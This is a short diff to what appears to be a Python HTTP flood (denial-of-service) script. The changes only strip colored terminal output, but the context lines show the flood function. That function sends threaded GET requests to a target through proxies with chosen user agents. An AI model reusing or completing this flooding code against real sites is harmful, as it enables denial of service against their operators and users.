@@ -3,7 +3,6 @@ import threading
 import time
 import re
 import requests
-from colorama import init, Fore
 
 from random import randrange
 from termcolor import colored
@@ -82,7 +81,7 @@ def get_proxies():
     return proxies
 
 def flood(user_agent: str, proxy: str, target: str, thread: int):
-    print(colored("[+] flood: thread #{}".format(str(thread)), 'cyan'))
+    print("[+] flood: thread #{}".format(str(thread)))
     headers = {
         'User-Agent': user_agent,
         'Content-Type': "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
@@ -93,7 +92,7 @@ def flood(user_agent: str, proxy: str, target: str, thread: int):
     try: 
         req = requests.get(target, headers=headers, proxies=proxies, timeout=5)
     except Exception as e:
-        print(colored("Error: " + str(e), 'red'))
+        print("Error: " + str(e))
         pass
 
 def main():
@@ -113,7 +112,7 @@ def main():
         if thread % sleep == 0:
             time.sleep(10)
     t.join()
-    print(colored("Finished!", 'green'))
+    print("Finished!")
 
 if __name__ == "__main__":
     main()
